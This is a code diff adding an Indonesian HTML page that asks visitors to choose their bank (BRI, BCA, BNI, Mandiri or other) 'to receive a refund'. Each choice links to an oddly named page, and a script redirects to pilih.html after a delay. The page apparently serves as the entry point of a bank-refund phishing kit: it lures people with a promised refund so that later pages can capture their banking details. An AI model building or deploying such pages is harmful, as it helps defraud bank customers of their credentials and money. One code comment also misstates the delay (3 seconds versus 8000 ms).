@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Menu Pilihan</title>
+  <style>
+    /* CSS untuk tata letak menu */
+    .menu-container {
+      text-align: center; /* Pusatkan teks */
+    }
+
+    .menu {
+      display: flex;
+      flex-direction: column;
+      gap: 10px; /* Jarak antara setiap menu */
+      width: 200px; /* Lebar menu */
+      margin: 20px auto; /* Posisikan menu di tengah */
+    }
+
+    /* CSS untuk gaya menu */
+    .menu-item {
+      background-color: #f0f0f0;
+      padding: 10px;
+      border-radius: 5px;
+      text-align: center;
+      text-decoration: none; /* Menghilangkan garis bawah pada tautan */
+      color: #333; /* Warna teks */
+    }
+
+    .menu-item:hover {
+      background-color: #e0e0e0; /* Warna latar belakang saat dihover */
+    }
+  </style>
+</head>
+<body>
+  <div class="menu-container">
+    <h2>Silahkan Pilih Bank Anda Untuk Refund Dana</h2>
+    <div class="menu">
+      <!-- Tautan menu pilihan -->
+      <a href="jajan.html" class="menu-item" onclick="showLoading()">Bank BRI</a>
+      <a href="jajann.html" class="menu-item" onclick="showLoading()">Bank BCA</a>
+      <a href="jajannn.html" class="menu-item" onclick="showLoading()">Bank BNI</a>
+      <a href="jajannnn.html" class="menu-item" onclick="showLoading()">Bank Mandiri</a>
+      <a href="lainnya.html" class="menu-item" onclick="showLoading()">Bank Lainnya</a>
+    </div>
+  </div>
+
+  <!-- Teks pesan menunggu -->
+  <p id="waitingMessage" style="display: none;">Mohon Tunggu...</p>
+
+  <script>
+    function showLoading() {
+      // Menampilkan pesan menunggu
+      var waitingMessage = document.getElementById('waitingMessage');
+      waitingMessage.style.display = 'block';
+
+      // Mengarahkan ke halaman selanjutnya setelah 3 detik
+      setTimeout(function() {
+        window.location.href = 'pilih.html';
+      }, 8000); // 3 detik
+    }
+  </script>
+</body>
+</html>
